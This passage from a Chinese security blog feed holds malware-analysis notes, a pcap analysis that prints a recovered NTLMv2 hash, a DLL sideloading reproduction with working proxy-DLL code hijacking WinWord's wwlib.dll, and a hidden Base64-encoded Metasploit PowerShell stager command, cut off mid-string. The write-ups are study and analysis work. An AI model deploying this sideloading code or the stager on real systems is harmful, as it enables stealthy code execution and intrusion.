}    result = a1;  }  else  {    if ( Size &lt; 0x20 )      goto CopyUpDwordMov;    if ( Size &lt; 0x80 )    {      if ( !_bittest(&amp;dword_5153EC, 1u) )        goto Dword_align;      goto XmmCopySmallTest;    }    if ( _bittest(dword_51628C, 1u) )    {      qmemcpy(a1, Src, Size);      return a1;    }    if ( (((unsigned int)Src ^ (unsigned int)a1) &amp; 0xF) == 0 &amp;&amp; _bittest(&amp;dword_5153EC, 1u) )    {      v45 = (unsigned __int8)Src &amp; 0xF;      if ( ((unsigned __int8)Src &amp; 0xF) != 0 )      {        v63 = Size - (16 - v45);        v60 = 16 - v45;        v61 = v60 &amp; 3;        if ( (v60 &amp; 3) != 0 )        {          do          {            v5-&gt;m128i_i8[0] = v3-&gt;m128i_i8[0];            v3 = (const __m128i *)((char *)v3 + 1);            v5 = (__m128i *)((char *)v5 + 1);            --v61;          }          while ( v61 );        }        for ( i = v60 &gt;&gt; 2; i; --i )        {          v5-&gt;m128i_i32[0] = v3-&gt;m128i_i32[0];          v3 = (const __m128i *)((char *)v3 + 4);          v5 = (__m128i *)((char *)v5 + 4);        }        v4 = v63;      }      v46 = v4;      v4 &amp;= 0x7Fu;      for ( j = v46 &gt;&gt; 7; j; --j )      {        v48 = _mm_load_si128(v3 + 1);        v49 = _mm_load_si128(v3 + 2);        v50 = _mm_load_si128(v3 + 3);        *v5 = _mm_load_si128(v3);        v5[1] = v48;        v5[2] = v49;        v5[3] = v50;        v51 = _mm_load_si128(v3 + 5);        v52 = _mm_load_si128(v3 + 6);        v53 = _mm_load_si128(v3 + 7);        v5[4] = _mm_load_si128(v3 + 4);        v5[5] = v51;        v5[6] = v52;        v5[7] = v53;        v3 += 8;        v5 += 8;      }XmmCopySmallTest:      if ( !v4 )        return a1;      for ( k = v4 &gt;&gt; 5; k; --k )      {        v55 = _mm_loadu_si128(v3 + 1);        *v5 = _mm_loadu_si128(v3);        v5[1] = v55;        v3 += 2;        v5 += 2;      }CopyUpDwordMov:      v56 = v4 &amp; 0x1F;      if ( v56 )      {        v57 = v56;        for ( l = v56 &gt;&gt; 2; l; --l )        {          v5-&gt;m128i_i32[0] = v3-&gt;m128i_i32[0];          v5 = (__m128i *)((char *)v5 + 4);          v3 = (const __m128i *)((char *)v3 + 4);        }        v59 = v57 &amp; 3;        if ( (v57 &amp; 3) != 0 )        {          do          {            v5-&gt;m128i_i8[0] = v3-&gt;m128i_i8[0];            v3 = (const __m128i *)((char *)v3 + 1);            v5 = (__m128i *)((char *)v5 + 1);            --v59;          }          while ( v59 );        }      }      return a1;    }    if ( !_bittest(dword_51628C, 0) || ((unsigned __int8)a1 &amp; 3) != 0 )    {Dword_align:      if ( ((unsigned __int8)a1 &amp; 3) != 0 )      {        do        {          v5-&gt;m128i_i8[0] = v3-&gt;m128i_i8[0];          --v4;          v3 = (const __m128i *)((char *)v3 + 1);          v5 = (__m128i *)((char *)v5 + 1);        }        while ( ((unsigned __int8)v5 &amp; 3) != 0 );      }      goto Dword_align_Ok;    }    if ( ((unsigned __int8)Src &amp; 3) != 0 )    {Dword_align_Ok:      v27 = v4;      if ( v4 &gt;= 0x20 )      {        v28 = v4 &gt;&gt; 2;        qmemcpy(v5, v3, 4 * v28);        v13 = (const __m128i *)((char *)v3 + 4 * v28);        v5 = (__m128i *)((char *)v5 + 4 * v28);        switch ( v27 &amp; 3 )        {          case 0:            goto TrailingUp0;          case 1:            goto TrailingUp1;          case 2:            goto TrailingUp2;          case 3:            goto TrailingUp3;        }      }      goto CopyUpDwordMov;    }    if ( _bittest((const int *)&amp;v5, 2u) )    {      v4 = Size - 4;      v3 = (const __m128i *)((char *)Src + 4);      *(_DWORD *)a1 = *(_DWORD *)Src;      v5 = (__m128i *)((char *)a1 + 4);    }    if ( _bittest((const int *)&amp;v5, 3u) )    {      v7 = v3-&gt;m128i_i64[0];      v4 -= 8;      v3 = (const __m128i *)((char *)v3 + 8);      v5-&gt;m128i_i64[0] = v7;      v5 = (__m128i *)((char *)v5 + 8);    }    if ( ((unsigned __int8)v3 &amp; 7) != 0 )    {      if ( _bittest((const int *)&amp;v3, 3u) )      {        v8 = _mm_load_si128((const __m128i *)((char *)v3 - 12));        v9 = (const __m128i *)((char *)v3 - 12);        do        {          v10 = _mm_load_si128(v9 + 1);          v4 -= 48;          v11 = _mm_load_si128(v9 + 2);          v12 = _mm_load_si128(v9 + 3);          v9 += 3;          *v5 = _mm_alignr_epi8(v10, v8, 12);          v5[1] = _mm_alignr_epi8(v11, v10, 12);          v8 = v12;          v5[2] = _mm_alignr_epi8(v12, v11, 12);          v5 += 3;        }        while ( v4 &gt;= 0x30 );        v13 = (const __m128i *)&amp;v9-&gt;m128i_i8[12];      }      else      {        v19 = _mm_load_si128((const __m128i *)((char *)v3 - 4));        v20 = (const __m128i *)((char *)v3 - 4);        do        {          v21 = _mm_load_si128(v20 + 1);          v4 -= 48;          v22 = _mm_load_si128(v20 + 2);          v23 = _mm_load_si128(v20 + 3);          v20 += 3;          *v5 = _mm_alignr_epi8(v21, v19, 4);          v5[1] = _mm_alignr_epi8(v22, v21, 4);          v19 = v23;          v5[2] = _mm_alignr_epi8(v23, v22, 4);          v5 += 3;        }        while ( v4 &gt;= 0x30 );        v13 = (const __m128i *)&amp;v20-&gt;m128i_i8[4];      }    }    else    {      v14 = _mm_load_si128((const __m128i *)((char *)v3 - 8));      v15 = (const __m128i *)((char *)v3 - 8);      do      {        v16 = _mm_load_si128(v15 + 1);        v4 -= 48;        v17 = _mm_load_si128(v15 + 2);        v18 = _mm_load_si128(v15 + 3);        v15 += 3;        *v5 = _mm_alignr_epi8(v16, v14, 8);        v5[1] = _mm_alignr_epi8(v17, v16, 8);        v14 = v18;        v5[2] = _mm_alignr_epi8(v18, v17, 8);        v5 += 3;      }      while ( v4 &gt;= 0x30 );      v13 = (const __m128i *)&amp;v15-&gt;m128i_i8[8];    }    while ( 2 )    {      if ( _bittest((const int *)&amp;v4, 2u) )      {        v25 = v13-&gt;m128i_i32[0];        v4 -= 4;        v13 = (const __m128i *)((char *)v13 + 4);        v5-&gt;m128i_i32[0] = v25;        v5 = (__m128i *)((char *)v5 + 4);      }      if ( _bittest((const int *)&amp;v4, 3u) )      {        v26 = v13-&gt;m128i_i64[0];        v4 -= 8;        v13 = (const __m128i *)((char *)v13 + 8);        v5-&gt;m128i_i64[0] = v26;        v5 = (__m128i *)((char *)v5 + 8);      }      switch ( v4 )      {        case 0u:TrailingUp0:          result = a1;          break;        case 1u:TrailingUp1:          v5-&gt;m128i_i8[0] = v13-&gt;m128i_i8[0];          result = a1;          break;        case 2u:TrailingUp2:          v5-&gt;m128i_i8[0] = v13-&gt;m128i_i8[0];          v5-&gt;m128i_i8[1] = v13-&gt;m128i_i8[1];          result = a1;          break;        case 3u:TrailingUp3:          v5-&gt;m128i_i8[0] = v13-&gt;m128i_i8[0];          v5-&gt;m128i_i8[1] = v13-&gt;m128i_i8[1];          v5-&gt;m128i_i8[2] = v13-&gt;m128i_i8[2];          result = a1;          break;        default:          v24 = _mm_loadu_si128(v13);          v4 -= 16;          ++v13;          *v5++ = v24;          continue;      }      break;    }  }  return result;}</code></pre><p>懒得分析解密过程，直接将样本关闭ASLR，拖入OD断点对应的位置分析<br>关闭ASLR参考链接:<a href="https://www.jianshu.com/p/91b2b6665e64" target="_blank" rel="noopener">关闭ASLR</a><br>PEView查看对应的偏移地址将40 81改为00 81 (小端内存读为80 41)<br>(搜索 40 81的第一个位置修改)<br><img src="https://s3.ax1x.com/2020/12/18/rYCt2V.png" alt=""></p><p>(修改之后)<br><img src="https://s3.ax1x.com/2020/12/18/rY9I3V.md.png" alt=""></p><p>OD打开Ctrl+G转到对应的地址，断点<br><img src="https://s3.ax1x.com/2020/12/18/rYkksf.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/18/rYFAUJ.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/18/rYiqHg.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/18/rYEm2n.png" alt=""></p><p>F8到把v4作为函数执行的时候<br><img src="https://s3.ax1x.com/2020/12/18/rYECKP.png" alt=""></p><p>读取UA头和winnet<br><img src="https://s3.ax1x.com/2020/12/18/rYEPDf.md.png" alt=""></p><p>然后读完部分payload后读取自身<br>(这里是看freebuf那篇文章所理解的)<br><img src="https://s3.ax1x.com/2020/12/18/rYVPzR.png" alt=""></p><p>OD验证<br><img src="https://s3.ax1x.com/2020/12/18/rYVGef.png" alt=""></p><p>之后获取Kernel.dll所有的函数<br><img src="https://s3.ax1x.com/2020/12/18/rYZMAU.png" alt=""></p><p>利用GetProcAddress获取了对应的API函数地址，并实例化该API<br><img src="https://s3.ax1x.com/2020/12/18/rYedrq.png" alt=""></p><p>利用OD插件windows API断点下断GetProcAddress能看到所有实例化的API<br>(太多了就不一一列出来了)<br><img src="https://s3.ax1x.com/2020/12/18/rY1xP0.png" alt=""></p><p>原本想跟着IDA的函数调用图一步一步OD调，然后不知道为什么无法生成，直接OD定位到main函数地址调试<br><img src="https://s3.ax1x.com/2020/12/18/rYNiqO.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/18/rYNEIH.png" alt=""></p><p>跟踪到Address:00453510的call执行完后就退出了，所以跟进去<br><img src="https://s3.ax1x.com/2020/12/18/rYUxjx.png" alt=""></p><p>跟进第一个call<br><img src="https://s3.ax1x.com/2020/12/18/rY0cMn.png" alt=""></p><p>得到wininet关键字<br><img src="https://s3.ax1x.com/2020/12/18/rY0HMR.png" alt=""></p><p>跟进call ebp发现获取自身加载的Module<br><img src="https://s3.ax1x.com/2020/12/18/rYBSRH.png" alt=""></p><p>加载了wchar.h,获取LoadLibraryExA关键字并实例化<br><img src="https://s3.ax1x.com/2020/12/18/rYBqpQ.png" alt=""></p><p>加载twain_32.dll<br><img src="https://s3.ax1x.com/2020/12/18/rYDpkT.png" alt=""></p><p>解除IP地址<br><img src="https://s3.ax1x.com/2020/12/18/rYXL8S.png" alt=""></p><p>解密出UA头<br><img src="https://s3.ax1x.com/2020/12/18/rYLTsA.png" alt=""></p><p>在wininet下断点，得到返回的数据<br><img src="https://s3.ax1x.com/2020/12/18/rYzYqJ.png" alt=""></p><p>23:26分<br>由于底子不行，调试到后面不会弄只能跟跟马子的行为<br>OD里的字符串<br><img src="https://s3.ax1x.com/2020/12/18/rteuXn.md.png" alt=""></p><p>文章后面作者成功dump了下载的第二段payload并解密保存<br>(实在是断不到那个解密后得到PE的点)<br><img src="https://s3.ax1x.com/2020/12/19/rt8vQK.png" alt=""></p><p>目标行为<br>读取对应的注册表和收集cookie保存在某个txt上传<br><img src="https://s3.ax1x.com/2020/12/19/rt8WR0.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/19/rt84MT.png" alt=""></p><p>远程下载<br><img src="https://s3.ax1x.com/2020/12/19/rt8ORx.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前并没有这么分析过，经过这次分析学习到了一些东西</p><ul><li>样本关闭ASLR</li><li>IDA和OD调试对比</li><li>断点的一些技巧</li></ul>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>malware-traffic恶意流量包分析笔记</title>
      <link href="/posts/daac1c3c.html"/>
      <url>/posts/daac1c3c.html</url>
      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>(中间停更过一段时间博客，因为懒都发星球去了。现在打算继续写)<br>翻到之前收藏的恶意流量分析练习的pcap地址，下载一个来弄弄<br><a href="https://www.malware-traffic-analysis.net/" target="_blank" rel="noopener">https://www.malware-traffic-analysis.net/</a><br>解压密码:infected<br><img src="https://s3.ax1x.com/2020/12/15/ru7id0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>wireshark打开后，我比较喜欢先统计一下所有的IP，和包里有什么协议，还有注意一下导出分组里的内容。<br>导出对象<br><img src="https://s3.ax1x.com/2020/12/15/ru7mQJ.png" alt=""><br>IP统计<br><img src="https://s3.ax1x.com/2020/12/15/ru7wwt.png" alt=""><br>协议分级<br><img src="https://s3.ax1x.com/2020/12/15/ru7ny9.png" alt=""></p><p>从上图可以得到以下几点信息：</p><ul><li>存在HTTP、SMB、LDAP、DNS流量</li><li>SMB和LDAP流量占多</li><li>源IP访问的目标IP端口</li></ul><p>看了一下HTTP流量，发现是下载了三个文件<br><img src="https://s3.ax1x.com/2020/12/15/ruHA0I.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruHZAP.png" alt=""></p><p>尝试过提取出来，发现并不行。失败了，将pcap上传到<a href="https://pcap.zhouhe.360.cn/发现VT上有样本" target="_blank" rel="noopener">https://pcap.zhouhe.360.cn/发现VT上有样本</a><br><img src="https://s3.ax1x.com/2020/12/15/ruL2CV.png" alt=""></p><p>三个都免杀，但是看了一下VT的检测结果。发现没有任何外连(不排除判断是否在虚拟机里运行，是的话直接ExitProcess)<br>查询结果：<a href="https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog" target="_blank" rel="noopener">https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog</a><br><img src="https://s3.ax1x.com/2020/12/15/ruLfvF.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruL4u4.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruL5DJ.png" alt=""></p><p>HTTP流量到这里貌似也没啥好追的了，看了一眼TLS也没啥异样<br><img src="https://s3.ax1x.com/2020/12/15/ruLH4x.png" alt=""></p><p>然后把目光转向smb，发现存在个域。使用Kerberos TGT访问的域控<br><img src="https://s3.ax1x.com/2020/12/15/ruLXvD.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruLOgO.png" alt=""></p><p>看了一下成功认证smb后访问过的文件和文件夹，也没有干啥<br><img src="https://s3.ax1x.com/2020/12/15/ruOpVA.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruOC5t.png" alt=""></p><p>后面用NTLMRawUnHide从数据包里提取出了一个NTLM<br><img src="https://s3.ax1x.com/2020/12/15/ruOF8f.png" alt=""></p><p>至此信息如下：</p><pre><code>HTTP------------domain:t497sword.com - 5.44.3.72 4- 俄罗斯莫斯科download.windowsupdate.com - 72.21.81.240 - 美国ctldl.windowsupdate.com -67.24.185.254 - 美国SMB-------------\\MRNATURAL.INFO\IPC$\\MrNatural-DC.mrnatural.info\IPC$info--------------10.12.1.101 hostname:Lenovo_2b Mac:10:c5:95:2b:13:0510.12.1.2 hostname:Dell_99 Mac:00:11:43:99:de:87[1;37mFound NTLMSSP Message Type 3 :[1;32m Authentication[0;37m    [1;34m&gt;[1;37m Domain                 :[0;97m MRNATURAL [0;37m    [1;34m&gt;[1;37m Username               :[0;97m fabulous.dale [0;37m    [1;34m&gt;[1;37m Workstation            :[0;97m DESKTOP-NATURAL [0;37m[1;37mNTLMv2 Hash recovered:[0;97mMRNATURAL\fabulous.dale::DESKTOP-NATURAL:100dd7adfc69d6a4:2a6c2ec69501afb83ce01d54e115314f:0101000000000000d0521c723bc8d601e8b8829daacf831700000000020012004d0052004e00410054005500520041004c00010018004d0052004e00410054005500520041004c002d004400430004001c006d0072006e00610074007500720061006c002e0069006e0066006f00030036004d0072004e00610074007500720061006c002d00440043002e006d0072006e00610074007500720061006c002e0069006e0066006f0005001c006d0072006e00610074007500720061006c002e0069006e0066006f0007000800d0521c723bc8d60106000400020000000800300030000000000000000000000000200000764598ededc17516e4c2b0bf2070ee5ff48e1dbf474b9cf30823f0967cb02e2e0a001000000000000000000000000000000000000900260063006900660073002f004d0052004e00410054005500520041004c002e0049004e0046004f000000000000000000</code></pre><p>后面追踪主机名，看到LDAP查询的内容</p><pre><code>&quot;DC=mrnatural,DC=info&quot;&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;&quot;CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=mrnatural,DC=info&quot;&quot;cn=policies,cn=system,DC=mrnatural,DC=info&quot;&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;</code></pre><p><img src="https://s3.ax1x.com/2020/12/15/ruOZrQ.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruOebj.png" alt=""></p><p>后面对着每个IP都检查了一下，发现可疑也就http流量的那三个。其他都无异样，后面去微步社区查了一下找到了以下信息<br><img src="https://s3.ax1x.com/2020/12/15/ruOQP0.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruO12T.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruOlGV.png" alt=""></p><p>至此也没什么好弄的，，，可能还有一些别的没发现吧。太菜了<br>以下微步社区和分析的链接：<br><a href="https://x.threatbook.cn/nodev4/ip/72.21.81.240" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/72.21.81.240</a><br><a href="https://x.threatbook.cn/nodev4/ip/67.24.185.254" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/67.24.185.254</a><br><a href="https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>白加黑wwlib.dll复现</title>
      <link href="/posts/7b49de5f.html"/>
      <url>/posts/7b49de5f.html</url>
      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今日看到某分析文章，利用word的wwlib.dll实现白加黑。虽然这个操作很早就有了，翻了一下笔记发现没有测过，实验一波并做测试</p><h2 id="白加黑概念"><a href="#白加黑概念" class="headerlink" title="白加黑概念"></a>白加黑概念</h2><p>白exe，黑dll<br>所谓白exe指拥有数字签名的exe，数字签名也分三六九等。大厂的签名一般都很不错，WinWord.exe的数字签名即为微软的数字签名<br><img src="https://s3.ax1x.com/2020/12/04/DbiDEV.png" alt=""></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>将WinWord.exe拖入IDA分析，追踪LoadLibraryW函数可以看到有几个调用<br><img src="https://s3.ax1x.com/2020/12/04/DbiggJ.md.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/04/DbifD1.md.png" alt=""></p><p>个人测试<br>（由于IDA不在虚拟机，直接把winword拖出到物理机看，和文章所测试的并不相同）<br><img src="https://s3.ax1x.com/2020/12/04/Dbio4O.md.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/04/Dbi7CD.png" alt=""></p><p>IDA不行的话<br>作者给出的其他的方法：<br>如果无法使用IDA静态分析我们可以使用API监控软件来观察，如火绒剑或API Monitor，当然也可以使用OD下断点来分析。（这里和使用IDA没什么区别，不同的PE文件用不同的方式来达到最好的效果）</p><p>OD断点LolibraryW，可以发现加载的wwlib.dll和其调用wwlib.dll内的函数<br><img src="https://s3.ax1x.com/2020/12/04/Dbijbt.png" alt=""></p><p>目前所知道的内容：</p><pre><code>* 加载的wwlib.dll    * 调用Fmain函数    * 调用wdCommandDispatch函数    * 调用wdGetApplicationObject函数</code></pre><p>利用手段：</p><pre><code>* vs自己写dll，实现调用的三个函数* msf直接生成个dll，在dllmain函数直接实现劫持</code></pre><p>wwlib.dll导出函数<br><img src="https://s3.ax1x.com/2020/12/04/DbFivj.png" alt=""></p><p>其实wwlib.dll可以拖入到IDA分析导出函数，然后在编写。由于这里测试的时候出现了点问题，直接拿文章给出的图按着构造即可</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) int FMain(int a, int b, int c, int d);extern &quot;C&quot; __declspec(dllexport) void wdCommandDispatch();extern &quot;C&quot; __declspec(dllexport) void wdGetApplicationObject();//extern &quot;C&quot; __declspec(dllexport) void DllCanUnloadNow(); //确定是否正在使用实现此功能的DLL。如果不是，则调用者可以从内存中卸载DLL。,不能重新定义//extern &quot;C&quot; __declspec(dllexport) void DllGetClassObject();//extern &quot;C&quot; __declspec(dllexport) void DllGetLCID();int FMain(int a,int b,int c,int d) {        MessageBoxA(0, &quot;test&quot;, &quot;test&quot;, MB_OK);        exit(0);        return 1;}void wdCommandDispatch() {}void wdGetApplicationObject() {}BOOL APIENTRY DllMain(        HINSTANCE hinstDLL,  // handle to DLL module        DWORD fdwReason,     // reason for calling function        LPVOID lpReserved)  // reserved{        // Perform actions based on the reason for calling.        switch (fdwReason)        {        case DLL_PROCESS_ATTACH:               // Initialize once for each new process.               // Return FALSE to fail DLL load.               break;        case DLL_THREAD_ATTACH:               // Do thread-specific initialization.               break;        case DLL_THREAD_DETACH:               // Do thread-specific cleanup.               break;        case DLL_PROCESS_DETACH:               // Perform any necessary cleanup.               break;        }        return TRUE;  // Successful DLL_PROCESS_ATTACH.}</code></pre><p>x86生成dll，替换掉原来的wwlib.dll即可看到定义的弹框<br><img src="https://s3.ax1x.com/2020/12/04/DbFM24.png" alt=""></p><p>注意事项:<br>写好对应要劫持的dll函数生成后，注意原来dll的位数。不要原本是x86生成个x64，那铁定跑不了。（tm我在这踩了一个小时的坑，xswzj）</p><p>dllmain函数处劫持（在DllMain中DLL_PROCESS_ATTACH选项下（每次加载DLL首先执行的地方））<br><img src="https://s3.ax1x.com/2020/12/04/DbF8q1.png" alt=""></p><p>实现劫持dll并使得winword正常运行，像上面粗暴的方法去定义dll函数。然后等着exe去执行，返回预期不一致的话导致exe无法正常运行退出。使得恢复exe正常运行最简单的方法就是把原来的dll改名，然后在调用处调用dll的函数（仅限于可以看见调用的导出函数）</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) int FMain(int a, int b, int c, int d);extern &quot;C&quot; __declspec(dllexport) void wdCommandDispatch();extern &quot;C&quot; __declspec(dllexport) void wdGetApplicationObject();//extern &quot;C&quot; __declspec(dllexport) void DllCanUnloadNow(); //确定是否正在使用实现此功能的DLL。如果不是，则调用者可以从内存中卸载DLL。,不能重新定义//extern &quot;C&quot; __declspec(dllexport) void DllGetClassObject();//extern &quot;C&quot; __declspec(dllexport) void DllGetLCID();typedef int(*run)(int a,int b,int c,int d);int FMain(int a,int b,int c,int d) {        MessageBoxA(0, &quot;test&quot;, &quot;test&quot;, MB_OK);        HMODULE v1 = LoadLibraryA(&quot;WWLIBS.DLL&quot;);        run v2 = (run)GetProcAddress(v1,&quot;FMain&quot;);        return v2(a,b,c,d);}void wdCommandDispatch() {}void wdGetApplicationObject() {}BOOL APIENTRY DllMain(        HINSTANCE hinstDLL,  // handle to DLL module        DWORD fdwReason,     // reason for calling function        LPVOID lpReserved)  // reserved{        // Perform actions based on the reason for calling.        switch (fdwReason)        {        case DLL_PROCESS_ATTACH:               // Initialize once for each new process.               // Return FALSE to fail DLL load.               break;        case DLL_THREAD_ATTACH:               // Do thread-specific initialization.               break;        case DLL_THREAD_DETACH:               // Do thread-specific cleanup.               break;        case DLL_PROCESS_DETACH:               // Perform any necessary cleanup.               break;        }        return TRUE;  // Successful DLL_PROCESS_ATTACH.}</code></pre><p>效果如下<br><img src="https://s3.ax1x.com/2020/12/04/DbFrqI.gif" alt=""></p><p>文章中重点:<br>如何发现存在DLL劫持漏洞的新可执行文件<br>其实网络世界中存在大把存在DLL劫持漏洞的应用程序，那么我们该如何选择对应的可执行文件呢？<br>1.独立的EXE文件来调用恶意DLL。（独立EXE必须为合法的白文件）<br>2.独立的EXE文件必须具有数字签名，并且该数字证书不会在短期内过期。<br>3.数字签名最好包括微软的数字签名。<br>4.独立的EXE必须使用Load来加载DLL且没有验证DLL。</p><p>防御与总结<br>首先对该类型的攻击有以下几个比较好的方法去防御。<br>1．可以检查网络连接异常的进程：首先我们可以将正常的网络通信进程链进行记录，当发现该进程的网络活动与记录的进程链不符时，则可能受到了DLL劫持攻击。<br>2．在加载DLL时，先将文件读入内存中验证其数字签名或是哈希值，发现不匹配则不加载该DLL。<br>3．当然Microsoft提供了一些关于DLL安全性和针对DLL劫持漏洞的相关文档。</p><p>参考链接:<a href="https://www.freebuf.com/articles/system/227824.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/227824.html</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>DerbyCon工具使用</title>
      <link href="/posts/9b2537f1.html"/>
      <url>/posts/9b2537f1.html</url>
      <content type="html"><![CDATA[<p>这是PCsXcetra计划在2019年的Derbycon演讲中发布的一组工具，用于快捷的分析一下shellcode或者powershell/混淆解码等<br>仓库地址：<a href="https://github.com/PCsXcetra/DerbyCon-2019Files" target="_blank" rel="noopener">https://github.com/PCsXcetra/DerbyCon-2019Files</a></p><h2 id="分析示例"><a href="#分析示例" class="headerlink" title="分析示例"></a>分析示例</h2><p>msf直接生成两个作为样本bin和psh-cmd</p><p>Extract-IP-From-Meterpreter-ShellCode.exe - 分析shellcode获得其中里面的ip和port。（只适用于msf的shellcode，可以把exe/bin文件的hex提取出来然后去执行）<br><img src="https://s1.ax1x.com/2020/11/11/BjcKf0.png" alt="shellcode raw"></p><p><img src="https://s1.ax1x.com/2020/11/11/Bjc3XF.png" alt="获取ip and port"></p><p>Base64EncoderDecoder.exe - base64解码（适用于powershell那种base64编码的）<br>psh-cmd</p><pre><code>%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAEYAaAAvAHEAMQA4AEMAQQA3AFYAVwBiAFcAKwBiAFMAQgBEACsAbgBFAGoAOQBEADYAaQB5AFoARgBBAGMAZwAxAE0AMwA1ADQAdABVADYAUQBCAEQAagBHAHQAUwBFADIAegBzADIARwBlAGQAQwBDAHkAdwA5AGIATAA0AFkASQBsAE4AZQB2ADMAdgBOADIAdgBqAE4ARgBYAFQAcQBqADMAcABFAEIATAA3AE0AaQAvAFAAUABEAE8ANwBRADEAVABTAGcATwBHAE0AQwBxAHcAbgBmAEgAcAAxAGUAagBMADIAYwB6ADgAVgB4AEUAYgBzAFAAYgBhAEUAQgBqAEkAZAA2AGUAUQBFAGwAaAB0AFYAZgBoAE0ASwA3AHcAUgB4AHEAVwA0ADIALwBTAHoAMQBNAFYAMQBkAFgAZQBsAGwAbgBpAFAASwBEAHYAUAAyAE4AVwBKAHEAVQBhAEQAMABuAG0AQgBVAGkASgBMAHcAagB6AEIATABVAEkANwBPAFAAOQB4AC8AUgBBAEUAVABQAGcAbQBOAHYAOQByAFgASgBMAHYAMwBTAFMAMQBXADYAWAA2AFEASQBPAEYAYwBwAFMASABmAEcAMgBXAEIAegA2AEcAMAAzAFEAMwBCAFQARwB6ACsAKwBXAGQAVABXAHAANQAzAFYAbQAzAGoANwA5AEkAbgBoAGQAaAAwAHEANABLAGgAdABCADAAUwAwAHAAUwBFAHoAeABKADMATwBLAGsAMgBTAEcAegBhAE8ATQBpAHoASQBvAHQAWQBlADQAYgBwAG0ANAB2ADIAbABCAFoAKwBoAEcANwBBADIAZwBPAHkARQBVAHUAeQBzAEcAaABLAEUAQQBXADgATwBXAEoAbABUAG8AVgA5AFAATgB6AEEAWQBWAHQAcwB3AG4AQwBjAFoANABFAGEAaABqAGsAcQBpAG0AWgBMAFcASABMAFQAeQA5AFgAcQBEADMARgBaACsANwAwAHQASwBjAE0AcABhAGwAdQBVAG8AVAB6AGIAdQBDAGgALwB3AEEARQBxADIAZwBPAGYAaABnAFQAZABvAG0AZwBGAFcAaQA3AEwATQBZADEAWABrAGcAUgBpAEQAOQBrAGEAaQBRADEAYQBF